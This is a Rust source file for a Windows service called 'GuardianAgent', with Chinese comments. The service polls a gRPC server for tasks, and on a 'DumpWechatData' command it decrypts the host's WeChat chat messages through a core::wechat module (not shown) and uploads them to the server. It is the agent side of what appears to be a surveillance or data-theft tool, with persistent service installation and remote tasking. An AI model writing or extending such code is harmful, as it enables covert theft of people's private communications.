use tonic::transport::Channel;
use guardian::agent_service_client::AgentServiceClient;
use guardian::HeartbeatRequest;
use guardian::data_service_client::DataServiceClient;
use guardian::{UploadMessagesRequest, ChatMessage};
use prost_types::Timestamp;
use std::time::{SystemTime, UNIX_EPOCH};
use std::ffi::OsString;
use std::sync::mpsc;
use std::thread;
use std::time::Duration;
use windows_service::service::{ServiceControl, ServiceControlAccept, ServiceExitCode, ServiceState, ServiceStatus, ServiceType};
use windows_service::service_control_handler::{self, ServiceControlHandlerResult};
use windows_service::service_dispatcher;
use windows_service::define_windows_service;
use windows_service::service::ServiceStatusHandle;
use windows_service::Result as WinServiceResult;

mod core;

mod guardian {
    tonic::include_proto!("guardian");
}

// ...existing code...

define_windows_service!(ffi_service_main, my_service_main);

fn main() -> WinServiceResult<()> {
    // 启动服务调度器
    service_dispatcher::start("GuardianAgent", ffi_service_main)?;
    Ok(())
}

fn my_service_main(_args: Vec<OsString>) {
    if let Err(e) = run_service() {
        // 记录错误
        eprintln!("Service error: {e}");
    }
}

fn run_service() -> WinServiceResult<()> {
    // 注册服务控制 handler
    let (shutdown_tx, shutdown_rx) = mpsc::channel();
    let status_handle = service_control_handler::register("GuardianAgent", move |control_event| {
        match control_event {
            ServiceControl::Stop | ServiceControl::Shutdown => {
                shutdown_tx.send(()).ok();
                ServiceControlHandlerResult::NoError
            }
            _ => ServiceControlHandlerResult::NotImplemented,
        }
    })?;

    // 设置服务为 Running
    set_service_status(&status_handle, ServiceState::Running)?;

    // 启动 tokio runtime
    let rt = tokio::runtime::Runtime::new().unwrap();
    rt.block_on(async move {
        loop {
            // 连接到 gRPC 服务器
            let mut client = match AgentServiceClient::connect("http://127.0.0.1:50051").await {
                Ok(c) => c,
                Err(e) => {
                    eprintln!("gRPC connect error: {e}");
                    tokio::time::sleep(Duration::from_secs(10)).await;
                    continue;
                }
            };

            // 构建 HeartbeatRequest
            let request = tonic::Request::new(HeartbeatRequest {
                agent_id: 1,
                hostname: whoami::hostname(),
            });

            // 调用 heartbeat 方法并解析响应
            let resp = match client.heartbeat(request).await {
                Ok(r) => r.into_inner(),
                Err(e) => {
                    eprintln!("Heartbeat error: {e}");
                    tokio::time::sleep(Duration::from_secs(10)).await;
                    continue;
                }
            };

            // 判断 task_type
            if resp.task_type == guardian::TaskType::DumpWechatData as i32 {
                // 获取消息
                let messages = core::wechat::decrypt_and_get_messages().unwrap_or_default();
                let now = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs() as i64;
                let chat_messages: Vec<ChatMessage> = messages.into_iter().map(|content| ChatMessage {
                    content,
                    timestamp: Some(Timestamp { seconds: now, nanos: 0 }),
                }).collect();

                // 上传消息
                if !chat_messages.is_empty() {
                    if let Ok(mut data_client) = DataServiceClient::connect("http://127.0.0.1:50051").await {
                        let upload_req = tonic::Request::new(UploadMessagesRequest {
                            agent_id: 1,
                            messages: chat_messages,
                        });
                        let _ = data_client.upload_messages(upload_req).await;
                    }
                }
            }

            // 检查是否收到停止信号
            if shutdown_rx.recv_timeout(Duration::from_secs(60)).is_ok() {
                break;
            }
        }
    });

    // 设置服务为 Stopped
    set_service_status(&status_handle, ServiceState::Stopped)?;
    Ok(())
}

fn set_service_status(handle: &ServiceStatusHandle, state: ServiceState) -> WinServiceResult<()> {
    handle.set_service_status(ServiceStatus {
        service_type: ServiceType::OWN_PROCESS,
        current_state: state,
        controls_accepted: ServiceControlAccept::STOP | ServiceControlAccept::SHUTDOWN,
        exit_code: ServiceExitCode::Win32(0),
        checkpoint: 0,
        wait_hint: Duration::default(),
        process_id: None,
    })
}
